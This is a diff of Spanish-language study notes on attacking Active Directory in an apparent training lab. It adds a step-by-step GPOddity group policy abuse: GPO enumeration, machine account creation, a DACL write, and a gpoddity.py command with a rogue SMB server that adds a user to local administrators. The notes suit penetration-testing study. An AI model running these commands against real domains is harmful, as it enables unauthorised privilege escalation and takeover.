@@ -201,6 +201,14 @@ Deberemos de darle a Build y esperar la respuesta de la Reverse Shell
 #### GPOddity
 Teniendo en el objetivo permisos de escritura sobre un recurso compartido y haber descubierto por ejemplo que se dedica a automatizar ejecuciones de *.lnk*, y también descubrir que el usuario que lo ejecuta tiene *GenericAll* sobre la política del grupo al que pertenece deberemos intentar explotar esta vulnerabilidad.
 
+```ad-info
+Deberemos de tener el SID de la politica sobre la que abusaremos primero ver las politicas del equipo que tiene el recurso compartido
+*Get-DomainGPO -ComputerIdentity DCORP-CI*
+
+Y despues obtener el SID de la politica
+*Get-DomainGPO -Identity 'DevOps Policy'*
+```
+
 ```ad-warning
 El firewal debe de estar desactivado
 ```
@@ -230,9 +238,25 @@ Deberemos de crear un nuevo equipo
 add_computer stdX-gpattack Secretpass@123
 ```
 
-Y añadir este a la Politica (El SID de la politica se obtiene ejecutando `)
+Y añadir este a la Politica
 ```shell
 write_gpo_dacl stdX-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
+```
+
+Una vez ejecutado eso deberemos de detener la shell de *LDAP* y de *ntlmrelayx*
+En WSL desplazarnos al directorio donde tenemos guardado GPOditty
+```shell
+cd /mnt/c/AD/Tools/GPOddity
+```
+
+Y ejecutar la herramienta
+```shell
+sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'studentx' --password 'gG38Ngqym2DpitXuGrsJ' --command 'net localgroup administrators studentx /add' --rogue-smbserver-ip '172.16.100.x' --rogue-smbserver-share 'stdx-gp' --dc-ip '172.16.2.1' --smb-mode none
+```
+
+Desde otra sesion de WSL deberemos de crear un directorio con el mismo nombre indicado en el comando anterior
+```shell
+mkdir /mnt/c/AD/Tools/stdx-gp
 ```
 
 
